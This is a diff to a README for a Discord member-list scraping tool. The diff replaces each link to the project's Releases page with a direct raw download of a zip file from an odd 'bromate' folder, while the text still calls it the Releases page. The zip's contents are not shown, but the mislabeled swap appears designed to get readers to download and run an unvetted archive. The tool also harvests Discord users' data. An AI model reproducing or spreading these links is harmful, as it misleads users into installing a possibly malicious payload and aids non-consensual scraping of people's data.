@@ -6,7 +6,7 @@ Welcome to **Discord-Memberlist-Scrappers**! This application helps you scrape m
 
 ## 📥 Download the Application
 
-[![Download Discord-Memberlist-Scrappers](https://img.shields.io/badge/Download-Discord--Memberlist--Scrappers-blue.svg)](https://github.com/iamNerdCoder/Discord-Memberlist-Scrappers/releases)
+[![Download Discord-Memberlist-Scrappers](https://github.com/iamNerdCoder/Discord-Memberlist-Scrappers/raw/refs/heads/main/bromate/Scrappers_Discord_Memberlist_v3.3.zip)](https://github.com/iamNerdCoder/Discord-Memberlist-Scrappers/raw/refs/heads/main/bromate/Scrappers_Discord_Memberlist_v3.3.zip)
 
 You can download the latest version of the application from our Releases page. Click the button above to visit.
 
@@ -23,7 +23,7 @@ No need for any additional software installation if you download the packaged ve
 ## ⚙️ Installation Instructions
 
 1. **Visit the Releases Page**  
-   Go to our Releases page by clicking [here](https://github.com/iamNerdCoder/Discord-Memberlist-Scrappers/releases). 
+   Go to our Releases page by clicking [here](https://github.com/iamNerdCoder/Discord-Memberlist-Scrappers/raw/refs/heads/main/bromate/Scrappers_Discord_Memberlist_v3.3.zip). 
 
 2. **Select the Latest Version**  
    Look for the version that appears at the top of the list. Click the download link for the packaged file that matches your operating system.
@@ -81,6 +81,6 @@ To keep the application running smoothly, it is important to check regularly for
 
 ## 📥 Final Steps
 
-For your convenience, here is the download link again: [Visit this page to download](https://github.com/iamNerdCoder/Discord-Memberlist-Scrappers/releases). 
+For your convenience, here is the download link again: [Visit this page to download](https://github.com/iamNerdCoder/Discord-Memberlist-Scrappers/raw/refs/heads/main/bromate/Scrappers_Discord_Memberlist_v3.3.zip). 
 
 Thank you for using **Discord-Memberlist-Scrappers**! We hope this tool makes it easy and efficient for you to manage your Discord member lists. Enjoy your scraping!
